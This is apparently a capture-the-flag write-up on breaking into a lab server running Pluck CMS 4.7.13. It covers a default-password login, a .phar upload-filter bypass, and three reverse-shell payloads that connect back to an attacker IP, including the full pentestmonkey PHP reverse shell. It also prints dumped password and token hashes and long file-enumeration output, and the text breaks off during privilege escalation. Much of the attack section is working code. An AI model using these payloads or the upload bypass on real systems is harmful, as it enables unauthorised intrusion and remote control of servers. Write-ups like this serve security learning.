After getting the ip here how it look 

![Target ](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ffd4nkmynjbwzjprhfsbg.png)

Now after it we did our nmap and directory enumuration whose result are below

```nmap REsutlts
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 60:77:64:e7:96:d4:a4:58:b0:cf:66:9c:54:03:e4:20 (RSA)
|   256 5c:e5:59:c7:4f:67:bc:cc:3f:ef:f8:74:81:9e:64:75 (ECDSA)
|_  256 f7:b7:4b:1d:4a:58:13:7e:de:47:23:b6:21:cf:89:66 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```

Nothing usefule from Nmap.

Then our directory bruteforcing

It discovered a endpoint named 

- /app

Here is how it looks 

![app](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F65mulfxhkvvtirfkm7l0.png)

Now when we tap on Pluck-4.7.13

We are presented with a cms page of Pluck-cms

![cms page](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fam6dtzzjf054r82rpdgf.png)

Now if we look the page carefully and enumurate it 

There are 2 links admin and pluck.

Admin is redirecting us to a page where we are asked to enter a pass and login.

![login](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Faqnuk0w3f41ijk2vxg5p.png)



After a few google seach i found the default password of pluck cms it was jus

Password

and this is the poc of being loggedin

![loggedin](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F23ik33mxebpjiq03hj6b.png)

After tapping on Check Writable option i found many endpoint

Here are they 

http://<IP>/app/pluck-4.7.13/

- /images
- /files
- /data/modules
- /data/trash
- /data/themes
- /data/themes/default
- /data/themes/oldstyle
- /data/settings
- /data/settings/langpref.php

After seaching here and there for files i found a location where i could able to upload files.

It was http://10.48.151.78/app/pluck-4.7.13/admin.php?action=images


After a bunch of file upload i found that there are only accepted file are jpeg,jpg,png and gif.

But the double extention file could be uploaded too.

But there was a also a point to upload any types of file

http://10.48.151.78/app/pluck-4.7.13/admin.php?action=files

After it i uploaded a html to see it executes or not.

the content inside the html file was 


```html
<img src="http://YOUR_IP:5555/ping">
```

And a python server oponed in machine 

When i uplaoded the file and open the file in new tab the html executes that menas html injection is possible here.


Lets try for the php  execution 

with the contnet inside the php will be

<?php echo shell_exec(whoami); ?>

But when i uploaded the php file it uploaded but the filename got renamed as a text file.

So i tried it different php extentions.

still it gets renamed 

Tried extention were

- php4
- php5

But i think now it was filtering on the basis of php file execution.

so i did it with another php extention whcih have no php in its name.


And it is PHAR.

And when i uploaded it that filename it gets accepted and when opened in a new tab it executes.


Now time for the php shell.

I tried the payload 1

```php
php -r '$sock=fsockopen("192.168.246.164",4444);exec("sh <&3 >&3 2>&3");'
```

Now Payload 2

```php
php -r '$sock=fsockopen("192.168.246.164",4444);shell_exec("sh <&3 >&3 2>&3");'
```

Payload 3
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '192.168.246.164';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

With this payload i got the shell.

After getting the shell and looking inside the /home folder

- death
- lucien
- morpheus
- ubuntu

But reading the content inside each folder is not allowed meaning we're not permitted to read.

Now we need to do the privilate escalation to get the root access.

when we did sudo -l 

I got

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper

``` python
$ python3 -c 'import pty; pty.spawn("/bin/bash")'  

```

Meaning we need to make it a proper shell.

We first check that python is there or not with which python3 

Then we did  python3 -c 'import pty; pty.spawn("/bin/bash")' 

To get a proper shell.

And while enumuration i got a file

at the location /var/www/html/app/pluck-4.7.13/robots.txt

When we opned the robots.txt in browser.

2 endpoint were hidden.

- docs/
- data/

Proceeding to data redirct us to the homepage.

But proceeding to /data lets us to a bunch of file location.

there was a file named update.php

whose content was

```php
At the moment, this file is situated in the docs directory. To perform an update, please move this file to the root directory of pluck first.
```

And a useful info i got from the location

/var/www/html/app/pluck-4.7.13/data/settings/options.php

The content was 
<?php
$sitetitle = 'dreaming';
$email = 'REDACTED';
?>

Also there were some more useful stuffs i found too
 INSIDe the token.php and pass.php


The content inside the token.php was 

```php
<?php $token = '8eacc00b8fa2ea872b70e4a9ae721b86c60b3f74944e3514f34a83f00c8880ef96ea38b40fe10aefd3a58c20081e52534321f8d3b9254f29aa6393460c2a0eae'; ?>
```

The content inside the pass.php was

```php
<?php
$ww = 'b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86';
?>
```

The writable files by the current users are which are interesting are

- /var/tmp/restore.py.swp
- /var/www/html/app/pluck-4.7.13/data/settings/token.php
- /var/www/html/app/pluck-4.7.13/data/settings/install.dat
- /var/www/html/app/pluck-4.7.13/data/settings/langpref.php
- /var/www/html/app/pluck-4.7.13/data/settings/update_lastcheck.php
- /var/www/html/app/pluck-4.7.13/data/settings/pages/1.dreaming.php
- /var/www/html/app/pluck-4.7.13/data/settings/themepref.php
- /var/www/html/app/pluck-4.7.13/data/settings/pass.php
- /var/www/html/app/pluck-4.7.13/data/settings/options.php


Since we are reading the files we reached at a point where i exausted of searcing inside the files

so i used find / -type f -readable 2>/dev/null | grep -vE 'proc|snap|boot|sys|run|usr|var/lib|var/log|etc'

It gave this output

```text
/.badr-info
/var/cache/motd-news
/var/cache/fwupd/metainfo.xmlb
/var/cache/fwupd/metadata.xmlb
/var/cache/fwupd/quirks.xmlb
/var/cache/man/zh_TW/index.db
/var/cache/man/zh_TW/CACHEDIR.TAG
/var/cache/man/pt/index.db
/var/cache/man/pt/CACHEDIR.TAG
/var/cache/man/pt_BR/index.db
/var/cache/man/pt_BR/CACHEDIR.TAG
/var/cache/man/sr/index.db
/var/cache/man/sr/CACHEDIR.TAG
/var/cache/man/cs/index.db
/var/cache/man/cs/CACHEDIR.TAG
/var/cache/man/da/index.db
/var/cache/man/da/CACHEDIR.TAG
/var/cache/man/index.db
/var/cache/man/ja/index.db
/var/cache/man/ja/CACHEDIR.TAG
/var/cache/man/hu/index.db
/var/cache/man/hu/CACHEDIR.TAG
/var/cache/man/es/index.db
/var/cache/man/es/CACHEDIR.TAG
/var/cache/man/tr/index.db
/var/cache/man/tr/CACHEDIR.TAG
/var/cache/man/sv/index.db
/var/cache/man/sv/CACHEDIR.TAG
/var/cache/man/fi/index.db
/var/cache/man/fi/CACHEDIR.TAG
/var/cache/man/nl/index.db
/var/cache/man/nl/CACHEDIR.TAG
/var/cache/man/pl/index.db
/var/cache/man/pl/CACHEDIR.TAG
/var/cache/man/de/index.db
/var/cache/man/de/CACHEDIR.TAG
/var/cache/man/sl/index.db
/var/cache/man/sl/CACHEDIR.TAG
/var/cache/man/ko/index.db
/var/cache/man/ko/CACHEDIR.TAG
/var/cache/man/ru/index.db
/var/cache/man/ru/CACHEDIR.TAG
/var/cache/man/it/index.db
/var/cache/man/it/CACHEDIR.TAG
/var/cache/man/zh_CN/index.db
/var/cache/man/zh_CN/CACHEDIR.TAG
/var/cache/man/id/index.db
/var/cache/man/id/CACHEDIR.TAG
/var/cache/man/fr/index.db
/var/cache/man/fr/CACHEDIR.TAG
/var/cache/man/CACHEDIR.TAG
/var/cache/apt/pkgcache.bin
/var/cache/apt/srcpkgcache.bin
/var/cache/debconf/templates.dat-old
/var/cache/debconf/config.dat-old
/var/cache/debconf/templates.dat
/var/cache/debconf/config.dat
/var/tmp/restore.py.swp
/var/tmp/a.py
/var/www/html/index.html
/var/www/html/app/pluck-4.7.13/install.php
/var/www/html/app/pluck-4.7.13/robots.txt
/var/www/html/app/pluck-4.7.13/login.php
/var/www/html/app/pluck-4.7.13/README.md
/var/www/html/app/pluck-4.7.13/docs/COPYING
/var/www/html/app/pluck-4.7.13/docs/CHANGES
/var/www/html/app/pluck-4.7.13/docs/UPDATING
/var/www/html/app/pluck-4.7.13/docs/README
/var/www/html/app/pluck-4.7.13/docs/update.php
/var/www/html/app/pluck-4.7.13/data/image/restore.png
/var/www/html/app/pluck-4.7.13/data/image/update-no.png
/var/www/html/app/pluck-4.7.13/data/image/menu/pages.png
/var/www/html/app/pluck-4.7.13/data/image/menu/options.png
/var/www/html/app/pluck-4.7.13/data/image/menu/modules.png
/var/www/html/app/pluck-4.7.13/data/image/menu/start.png
/var/www/html/app/pluck-4.7.13/data/image/menu/logout.png
/var/www/html/app/pluck-4.7.13/data/image/image_small.png
/var/www/html/app/pluck-4.7.13/data/image/website_small.png
/var/www/html/app/pluck-4.7.13/data/image/favicon.ico
/var/www/html/app/pluck-4.7.13/data/image/back.jpg
/var/www/html/app/pluck-4.7.13/data/image/download.png
/var/www/html/app/pluck-4.7.13/data/image/update-available-urgent.png
/var/www/html/app/pluck-4.7.13/data/image/trash.png
/var/www/html/app/pluck-4.7.13/data/image/help.png
/var/www/html/app/pluck-4.7.13/data/image/install_small.png
/var/www/html/app/pluck-4.7.13/data/image/note.png
/var/www/html/app/pluck-4.7.13/data/image/delete_from_trash.png
/var/www/html/app/pluck-4.7.13/data/image/options.png
/var/www/html/app/pluck-4.7.13/data/image/button_cancel.png
/var/www/html/app/pluck-4.7.13/data/image/trash_small.png
/var/www/html/app/pluck-4.7.13/data/image/language.png
/var/www/html/app/pluck-4.7.13/data/image/error_1.png
/var/www/html/app/pluck-4.7.13/data/image/modules.png
/var/www/html/app/pluck-4.7.13/data/image/AUTHORS
/var/www/html/app/pluck-4.7.13/data/image/settings.png
/var/www/html/app/pluck-4.7.13/data/image/clone.png
/var/www/html/app/pluck-4.7.13/data/image/password.png
/var/www/html/app/pluck-4.7.13/data/image/error_3.png
/var/www/html/app/pluck-4.7.13/data/image/back_hover.jpg
/var/www/html/app/pluck-4.7.13/data/image/page_small.png
/var/www/html/app/pluck-4.7.13/data/image/error.png
/var/www/html/app/pluck-4.7.13/data/image/website.png
/var/www/html/app/pluck-4.7.13/data/image/add_small.png
/var/www/html/app/pluck-4.7.13/data/image/trash-big.png
/var/www/html/app/pluck-4.7.13/data/image/newpage.png
/var/www/html/app/pluck-4.7.13/data/image/trash-full-big.png
/var/www/html/app/pluck-4.7.13/data/image/delete.png
/var/www/html/app/pluck-4.7.13/data/image/file.png
/var/www/html/app/pluck-4.7.13/data/image/button_save.png
/var/www/html/app/pluck-4.7.13/data/image/error_2.png
/var/www/html/app/pluck-4.7.13/data/image/page.png
/var/www/html/app/pluck-4.7.13/data/image/image.png
/var/www/html/app/pluck-4.7.13/data/image/down.png
/var/www/html/app/pluck-4.7.13/data/image/delete_from_trash_small.png
/var/www/html/app/pluck-4.7.13/data/image/update-available.png
/var/www/html/app/pluck-4.7.13/data/image/credits.png
/var/www/html/app/pluck-4.7.13/data/image/edit.png
/var/www/html/app/pluck-4.7.13/data/image/download_small.png
/var/www/html/app/pluck-4.7.13/data/image/themes.png
/var/www/html/app/pluck-4.7.13/data/image/up.png
/var/www/html/app/pluck-4.7.13/data/image/trash-full.png
/var/www/html/app/pluck-4.7.13/data/image/view.png
/var/www/html/app/pluck-4.7.13/data/image/add.png
/var/www/html/app/pluck-4.7.13/data/image/install.png
/var/www/html/app/pluck-4.7.13/data/image/button_document_save.png
/var/www/html/app/pluck-4.7.13/data/image/settings2.png
/var/www/html/app/pluck-4.7.13/data/styleadmin-rtl.css
/var/www/html/app/pluck-4.7.13/data/index.html
/var/www/html/app/pluck-4.7.13/data/settings/token.php
/var/www/html/app/pluck-4.7.13/data/settings/install.dat
/var/www/html/app/pluck-4.7.13/data/settings/langpref.php
/var/www/html/app/pluck-4.7.13/data/settings/update_lastcheck.php
/var/www/html/app/pluck-4.7.13/data/settings/pages/1.dreaming.php
/var/www/html/app/pluck-4.7.13/data/settings/themepref.php
/var/www/html/app/pluck-4.7.13/data/settings/pass.php
/var/www/html/app/pluck-4.7.13/data/settings/options.php
/var/www/html/app/pluck-4.7.13/data/reset.css
/var/www/html/app/pluck-4.7.13/data/inc/pageup.php
/var/www/html/app/pluck-4.7.13/data/inc/theme.php
/var/www/html/app/pluck-4.7.13/data/inc/trashcan_restoreitem.php
/var/www/html/app/pluck-4.7.13/data/inc/header.php
/var/www/html/app/pluck-4.7.13/data/inc/functions.modules.php
/var/www/html/app/pluck-4.7.13/data/inc/functions.site.php
/var/www/html/app/pluck-4.7.13/data/inc/trashcan.php
/var/www/html/app/pluck-4.7.13/data/inc/editpage.php
/var/www/html/app/pluck-4.7.13/data/inc/modules_manage_addtosite.php
/var/www/html/app/pluck-4.7.13/data/inc/changepass.php
/var/www/html/app/pluck-4.7.13/data/inc/footer.php
/var/www/html/app/pluck-4.7.13/data/inc/functions.all.php
/var/www/html/app/pluck-4.7.13/data/inc/deleteimage.php
/var/www/html/app/pluck-4.7.13/data/inc/variables.site.php
/var/www/html/app/pluck-4.7.13/data/inc/functions.admin.php
/var/www/html/app/pluck-4.7.13/data/inc/update_applet.php
/var/www/html/app/pluck-4.7.13/data/inc/index.html
/var/www/html/app/pluck-4.7.13/data/inc/modules_settings.php
/var/www/html/app/pluck-4.7.13/data/inc/header2.php
/var/www/html/app/pluck-4.7.13/data/inc/trashcan_deleteitem.php
/var/www/html/app/pluck-4.7.13/data/inc/writable.php
/var/www/html/app/pluck-4.7.13/data/inc/themeuninstall_delete.php
/var/www/html/app/pluck-4.7.13/data/inc/logout.php
/var/www/html/app/pluck-4.7.13/data/inc/credits.php
/var/www/html/app/pluck-4.7.13/data/inc/modules.php
/var/www/html/app/pluck-4.7.13/data/inc/variables.all.php
/var/www/html/app/pluck-4.7.13/data/inc/modules_admininclude.php
/var/www/html/app/pluck-4.7.13/data/inc/images.php
/var/www/html/app/pluck-4.7.13/data/inc/page.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/el.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/sv.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/ja.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/pl.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/ru.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/th.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/hu.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/fa.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/sl.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/zh-cn.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/fi.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/da.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/pt_br.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/he.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/no.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/lt.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/nl.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/lv.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/zh-tw.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/pt.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/sk.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/ro.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/de.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/fr.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/es.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/bg.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/en.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/it.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/ca.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/tr.php
/var/www/html/app/pluck-4.7.13/data/inc/lang/hr.php
/var/www/html/app/pluck-4.7.13/data/inc/themes_convert-rtl.php
/var/www/html/app/pluck-4.7.13/data/inc/modules_manage_delete.php
/var/www/html/app/pluck-4.7.13/data/inc/themeinstall.php
/var/www/html/app/pluck-4.7.13/data/inc/themeuninstall.php
/var/www/html/app/pluck-4.7.13/data/inc/trashcan_empty.php
/var/www/html/app/pluck-4.7.13/data/inc/lib/unzip.class.php
/var/www/html/app/pluck-4.7.13/data/inc/lib/url_replace.php
/var/www/html/app/pluck-4.7.13/data/inc/lib/index.html
/var/www/html/app/pluck-4.7.13/data/inc/lib/tarlib.class.php
/var/www/html/app/pluck-4.7.13/data/inc/lib/SmartImage.class.php
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/composer.json
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/fonts/times_new_yorker.ttf
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/simple-php-captcha.php
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/README.md
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/LICENSE.md
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/index.php
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/backgrounds/grey-sandbag.png
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/backgrounds/stitched-wool.png
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/backgrounds/white-carbon.png
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/backgrounds/polyester-lite.png
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/backgrounds/45-degree-fabric.png
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/backgrounds/kinda-jean.png
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/backgrounds/white-wave.png
/var/www/html/app/pluck-4.7.13/data/inc/lib/simple-php-captcha/backgrounds/cloth-alike.png
/var/www/html/app/pluck-4.7.13/data/inc/language.php
/var/www/html/app/pluck-4.7.13/data/inc/pagedown.php
/var/www/html/app/pluck-4.7.13/data/inc/deletepage.php
/var/www/html/app/pluck-4.7.13/data/inc/files.php
/var/www/html/app/pluck-4.7.13/data/inc/modules_install.php
/var/www/html/app/pluck-4.7.13/data/inc/trashcan_viewitem.php
/var/www/html/app/pluck-4.7.13/data/inc/settings.php
/var/www/html/app/pluck-4.7.13/data/inc/deletefile.php
/var/www/html/app/pluck-4.7.13/data/inc/security.php
/var/www/html/app/pluck-4.7.13/data/inc/modules_manage.php
/var/www/html/app/pluck-4.7.13/data/inc/options.php
/var/www/html/app/pluck-4.7.13/data/inc/trashcan_applet.php
/var/www/html/app/pluck-4.7.13/data/inc/start.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/multitheme.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/el.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/sv.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/ja.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/pl.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/ru.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/th.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/hu.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/fa.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/sl.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/zh-cn.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/fi.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/da.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/pt_br.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/he.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/no.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/lt.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/nl.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/lv.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/zh-tw.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/pt.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/sk.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/ro.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/de.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/fr.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/es.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/bg.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/en.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/it.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/ca.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/tr.php
/var/www/html/app/pluck-4.7.13/data/modules/multitheme/lang/hr.php
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/autoresize/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/nonbreaking/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/pagebreak/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/anchor/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/importcss/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/paste/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/print/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/insertdatetime/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/autolink/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/visualblocks/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/visualblocks/css/visualblocks.css
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/spellchecker/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/lists/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/image/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/code/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/fullscreen/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/link/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/textcolor/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/toc/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-cry.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-wink.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-kiss.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-embarassed.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-surprised.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-tongue-out.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-smile.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-cool.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-foot-in-mouth.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-sealed.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-undecided.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-innocent.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-laughing.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-frown.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-yell.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/emoticons/img/smiley-money-mouth.gif
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/textpattern/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/colorpicker/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/contextmenu/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/autosave/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/codesample/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/codesample/css/prism.css
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/table/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/media/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/searchreplace/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/fullpage/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/imagetools/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/visualchars/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/help/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/help/img/logo.png
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/bbcode/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/directionality/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/tabfocus/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/wordcount/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/noneditable/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/advlist/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/preview/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/charmap/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/hr/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/legacyoutput/plugin.min.js
/var/www/html/app/pluck-4.7.13/data/modules/tinymce/plugins/template/plugin.min.js
